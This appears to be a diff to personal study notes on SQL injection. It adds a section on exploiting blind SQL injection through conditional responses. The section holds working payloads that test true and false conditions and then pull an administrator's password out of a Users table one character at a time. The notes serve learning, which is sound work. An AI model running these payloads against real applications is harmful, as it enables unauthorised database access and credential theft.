@@ -31,10 +31,17 @@ For a UNION query to work, two key requirements must be met:
 
 #### Blind SQL injection vulnerabilities
 
-##### Techniques
+##### Exploiting blind SQL injection by triggering conditional responses
 
-- ***Out-of-band network interaction***
-- ***Time lapses***
+```sql
+> xyz' UNION SELECT 'a' WHERE 1=1--
+> xyz' UNION SELECT 'a' WHERE 1=2-- 
+
+> xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
+> xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'-- 
+...
+> xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'-- 
+```
 
 #### How to detect SQL injection vulnerabilities
 
